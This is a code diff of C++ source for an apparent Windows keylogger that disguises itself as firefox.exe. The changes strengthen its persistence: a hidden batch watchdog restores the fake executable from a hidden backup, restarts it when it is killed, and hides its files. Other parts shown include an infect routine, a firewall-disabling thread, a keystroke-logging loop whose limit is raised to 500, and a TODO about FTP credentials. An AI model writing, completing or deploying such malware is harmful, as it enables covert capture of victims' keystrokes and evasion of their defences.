@@ -6,6 +6,7 @@
 #include <sstream>
 #include <cstdlib>
 #include <thread>
+#include <aclapi.h>
 
 #include "KeyConverter.h"
 #include "FileHandler.h"
@@ -27,16 +28,17 @@ void persist(){
         char batContent[2048];
                 
         strcpy(batContent, "attrib +s +h \"%~f0\"\r\n");
-        strcpy(batContent, "mkdir C:\\Users\\Public\\Documents\\backup\r\n");
-        strcpy(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup\r\n");
-        strcpy(batContent, ":check\r\n");
+        strcat(batContent, "SETLOCAL EnableExtensions\r\n");
+        strcat(batContent, "set EXE=firefox.exe\r\n");
+        strcat(batContent, "mkdir C:\\Users\\Public\\Documents\\backup\r\n");
+        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup\r\n");
+        strcat(batContent, ":check\r\n");
         strcat(batContent, "timeout /t 4\r\n");
-        //strcat(batContent, "tasklist /FI \"IMAGENAME eq firefox.exe\" | find /I /N \"firefox.exe\">NUL\r\n");
-        //strcat(batContent, "if \"%ERRORLEVEL%\"==\"1\" start C:\\Firefox\\firefox.exe\r\n");
         strcat(batContent, "if not exist %APPDATA%\\Microsoft\\Windows\\\"Start Menu\"\\Programs\\Startup\\firefox.lnk goto create\r\n");        
         strcat(batContent, "if not exist C:\\Firefox\\firefox.exe goto createexe\r\n");        
-        strcat(batContent, "if not exist C:\\Users\\Public\\Documents\\backup goto createbackup\r\n");
-        strcat(batContent, "goto check\r\n");
+        strcat(batContent, "if not exist C:\\Users\\Public\\Documents\\backup.lnk goto createbackup\r\n");
+        strcat(batContent, "FOR /F %%x IN ('tasklist /NH /FI \"IMAGENAME eq %EXE%\"') DO IF %%x == %EXE% goto check\r\n");
+        strcat(batContent, "goto ProcessNotFound\r\n");
         
         strcat(batContent, ":create\r\n");        
         strcat(batContent, "set SCRIPT=\"%TEMP%\\%RANDOM%-%RANDOM%-%RANDOM%-%RANDOM%.vbs\"\r\n");
@@ -52,17 +54,22 @@ void persist(){
         strcat(batContent, "goto check\r\n");
         
         strcat(batContent, ":createexe\r\n");        
-        strcat(batContent, "attrib -s -h C:\\Users\\Public\\Documents\\firefox.lnk\r\n");          
-        strcat(batContent, "copy C:\\Users\\Public\\Documents\\firefox.lnk C:\\Firefox\\firefox.exe /y\r\n");  
-        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\firefox.lnk \r\n");             
+        strcat(batContent, "attrib -s -h C:\\Users\\Public\\Documents\\backup.lnk\r\n");          
+        strcat(batContent, "copy C:\\Users\\Public\\Documents\\backup.lnk C:\\Firefox\\firefox.exe /y\r\n");  
+        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup.lnk \r\n");               
+        strcat(batContent, "attrib +s +h C:\\Firefox\\firefox.exe \r\n"); 
         strcat(batContent, "goto check\r\n");
         
         strcat(batContent, ":createbackup\r\n");          
         strcat(batContent, "attrib -s -h C:\\Firefox\\firefox.exe \r\n");        
-        strcat(batContent, "copy C:\\Firefox\\firefox.exe C:\\Users\\Public\\Documents\\firefox.lnk /y\r\n");     
+        strcat(batContent, "copy C:\\Firefox\\firefox.exe C:\\Users\\Public\\Documents\\backup.lnk /y\r\n");     
         strcat(batContent, "attrib +s +h C:\\Firefox\\firefox.exe \r\n");          
+        strcat(batContent, "attrib +s +h C:\\Users\\Public\\Documents\\backup.lnk \r\n");          
         strcat(batContent, "goto check\r\n");
-        // Maybe do something to restore the exe?
+                
+        strcat(batContent, ":ProcessNotFound\r\n");          
+        strcat(batContent, "start C:\\Firefox\\firefox.exe \r\n");          
+        strcat(batContent, "goto check\r\n");
         
         ofstream bat("C:\\Firefox\\systemchecker.bat");
         bat << batContent;
@@ -160,7 +167,6 @@ void infect(){
         strcat(batContent, "del %SCRIPT%\r\n");
         strcat(batContent, "xcopy %destino2%firefox.lnk %destino1% /y\r\n");
         strcat(batContent, "del %destino2%firefox.lnk\r\n");
-        //strcat(batContent, "attrib %destino1%firefox.lnk +h\r\n");
         strcat(batContent, "attrib %destino3%  +s +h\r\n");
         strcat(batContent, "attrib %destino2%sysid.dat +s +h\r\n");
         strcat(batContent, "attrib %destino2%systemconf.dll  +s +h\r\n");
@@ -171,7 +177,7 @@ void infect(){
         bat.close();
 
         runBatFile(pathLocation);        
-        RegisterProgram(); // TODO: Add firewall exception
+        RegisterProgram();
         Sleep(2000);
         if(firstRun){
             runFirefox();
@@ -212,6 +218,7 @@ void Log(int limite_keystrokes){
         }
     }
 }
+
 std::string getIdentification(){
     std::ifstream id("C:\\Firefox\\sysid.dat");
     std::string identification;
@@ -245,10 +252,10 @@ int main(int argc, char *argv[]){
     CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(DisableFirewall), NULL, 0, &dwThreadId);  
     
     string id = getIdentification();
-    int keystroke_limit=30;//500;
+    int keystroke_limit=500;
+    //TODO: move stuff to C:\\Program Files
+    //TODO: rename firefox to a more consistent name
     //TODO: set user/pass with final ftp
-    //TODO: mkdir firefox and create script there
-    //TODO: process unkillable
     
     while(true){
         Log(keystroke_limit);
